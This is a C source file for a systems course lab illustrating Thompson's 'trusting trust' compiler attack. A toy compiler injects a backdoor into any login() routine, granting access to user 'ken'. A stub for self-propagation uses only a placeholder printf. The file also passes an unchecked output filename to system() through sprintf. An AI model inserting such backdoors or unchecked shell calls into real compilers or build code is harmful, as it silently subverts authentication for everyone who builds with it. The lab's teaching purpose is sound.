// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)


// a not very interesting compile: throw the input into a 
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

    /*****************************************************************
     * Step 1:
     */
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {\n    ";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;\n    ";

    char *login_sig_pos = strstr(program, login_sig);


    if (login_sig_pos != NULL) {
        size_t insert_index = login_sig_pos - program + strlen(login_sig);
        size_t new_size = strlen(program) + strlen(login_attack);
        printf("orig size: %zu\n", strlen(program)+1);
        printf("new size: %zu\n", new_size);

        char attack_program[new_size];
        strncpy(attack_program, program, insert_index);
        strcat(attack_program, login_attack);
        strcat(attack_program, login_sig_pos + strlen(login_sig));

        fprintf(fp, "%s", attack_program);
        fclose(fp);
    } else {
        fprintf(fp, "%s", program);
        fclose(fp);
    }



    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] 
              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";



    /************************************************************
     * don't modify the rest.
     */

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);

    for(int i=0; i<argc; i++)
        printf("argument %d: %s\n", i, argv[i]);
    
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
